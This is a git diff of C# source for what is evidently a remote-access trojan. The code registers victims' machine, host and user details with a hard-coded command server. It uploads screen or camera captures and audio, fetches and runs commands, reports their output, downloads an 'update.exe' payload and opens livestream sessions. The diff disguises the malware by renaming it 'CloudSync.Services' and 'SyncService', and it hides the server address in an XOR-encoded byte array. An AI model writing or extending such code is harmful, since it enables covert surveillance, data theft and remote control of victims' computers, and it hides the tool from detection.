@@ -1,4 +1,4 @@
-using G2DK.Functionalities.Livestream.WebRTC;
+using CloudSync.Services.Modules.Stream.Signaling;
 using Imagekit.Sdk;
 using Newtonsoft.Json;
 using System;
@@ -15,16 +15,31 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using static G2DK.Utilities.Communication;
+using static CloudSync.Services.Core.Communication;
 
-namespace G2DK.Utilities
+namespace CloudSync.Services.Core
 {
-    public class Communication
+    public class SyncService
     {
         
         public static ConcurrentQueue<Command> commands = new ConcurrentQueue<Command>();
         public static readonly SemaphoreSlim Signal = new SemaphoreSlim(0);
-        public static readonly string URL = "http://141.11.185.92:8801/api";
+
+        // XOR-encoded URL (key=0x5A)
+        private static readonly byte[] _enc = new byte[] {
+            0x32, 0x2e, 0x2e, 0x2a, 0x60, 0x75, 0x75, 0x6b, 0x6e, 0x6b, 0x74, 0x6b,
+            0x6b, 0x74, 0x6b, 0x62, 0x6f, 0x74, 0x63, 0x68, 0x60, 0x62, 0x62, 0x6a,
+            0x6b, 0x75, 0x3b, 0x2a, 0x33
+        };
+        public static readonly string URL = _Decode(_enc);
+
+        private static string _Decode(byte[] data)
+        {
+            char[] result = new char[data.Length];
+            for (int i = 0; i < data.Length; i++)
+                result[i] = (char)(data[i] ^ 0x5A);
+            return new string(result);
+        }
 
         public async static Task Register(int depth)
         {
@@ -36,14 +51,14 @@ namespace G2DK.Utilities
                     {
                         var payload = new
                         {
-                            machine_id = Provider.GetMachineId(),
-                            hostname = Provider.GetHostname(),
-                            username = Provider.GetUsername(),
-                            os = Provider.OS(),
-                            process_id = $"{Provider.GetProcessId()}",
-                            key = Provider.GetMachineId().Substring(0, 32),
-                            iv = Provider.GetMachineId().Substring(0, 16),
-                            hash = Provider.GetHash()
+                            machine_id = AppConfig.GetMachineId(),
+                            hostname = AppConfig.GetHostname(),
+                            username = AppConfig.GetUsername(),
+                            os = AppConfig.OS(),
+                            process_id = $"{AppConfig.GetProcessId()}",
+                            key = AppConfig.GetMachineId().Substring(0, 32),
+                            iv = AppConfig.GetMachineId().Substring(0, 16),
+                            hash = AppConfig.GetHash()
                         };
                         string json = JsonConvert.SerializeObject(payload);
 
@@ -91,7 +106,7 @@ namespace G2DK.Utilities
                         using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/capture-{type}"))
                         {
                             MultipartFormDataContent formData = new MultipartFormDataContent();
-                            formData.Add(new StringContent(Provider.GetMachineId()), "id");
+                            formData.Add(new StringContent(AppConfig.GetMachineId()), "id");
                             formData.Add(new StringContent(commandId), "command_id");
 
                             ByteArrayContent imageContent = new ByteArrayContent(image);
@@ -126,7 +141,7 @@ namespace G2DK.Utilities
                         using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, $"{URL}/capture-audio"))
                         {
                             MultipartFormDataContent formData = new MultipartFormDataContent();
-                            formData.Add(new StringContent(Provider.GetMachineId()), "id");
+                            formData.Add(new StringContent(AppConfig.GetMachineId()), "id");
 
                             //StreamContent audioContent = new StreamContent(memoryStream);
                             //audioContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("audio/wav");
@@ -169,7 +184,7 @@ namespace G2DK.Utilities
                     {
                         var payload = new
                         {
-                            id = Provider.GetMachineId(),
+                            id = AppConfig.GetMachineId(),
                             command_id,
                             log
                         };
@@ -200,12 +215,12 @@ namespace G2DK.Utilities
             {
                 try
                 {
-                    //Console.WriteLine($"MACHINE ID: {Provider.GetMachineId()}");
+                    //Console.WriteLine($"MACHINE ID: {AppConfig.GetMachineId()}");
                     using (HttpClient client = new HttpClient())
                     {
                         var payload = new
                         {
-                            id = Provider.GetMachineId(),
+                            id = AppConfig.GetMachineId(),
                             command_id,
                             output
                         };
@@ -237,7 +252,7 @@ namespace G2DK.Utilities
             {
                 using (HttpClient client = new HttpClient())
                 {
-                    using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, $"{URL}/command?id={Provider.GetMachineId()}"))
+                    using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, $"{URL}/command?id={AppConfig.GetMachineId()}"))
                     {
                         request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                         request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
@@ -266,7 +281,7 @@ namespace G2DK.Utilities
             try
             {
                 string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
-                string appFolder = Path.Combine(localAppData, Provider.APP);
+                string appFolder = Path.Combine(localAppData, AppConfig.APP);
                 Directory.CreateDirectory(appFolder);
                 string savedPath = Path.Combine(appFolder, "update.exe");
 
@@ -296,7 +311,7 @@ namespace G2DK.Utilities
                 {
                     using (HttpClient client = new HttpClient())
                     {
-                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, $"{URL}/livestream-session?id={session}&target_id={Provider.GetMachineId()}"))
+                        using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, $"{URL}/livestream-session?id={session}&target_id={AppConfig.GetMachineId()}"))
                         {
                             request.Headers.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
                             request.Headers.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
@@ -333,7 +348,7 @@ namespace G2DK.Utilities
                         var payload = new
                         {
                             id = session,
-                            machine_id = Provider.GetMachineId(),
+                            machine_id = AppConfig.GetMachineId(),
                             sdp
                         };
                         string json = JsonConvert.SerializeObject(payload);
@@ -368,7 +383,7 @@ namespace G2DK.Utilities
                         var payload = new
                         {
                             id = session,
-                            machine_id = Provider.GetMachineId(),
+                            machine_id = AppConfig.GetMachineId(),
                             candidate
                         };
                         string json = JsonConvert.SerializeObject(payload);
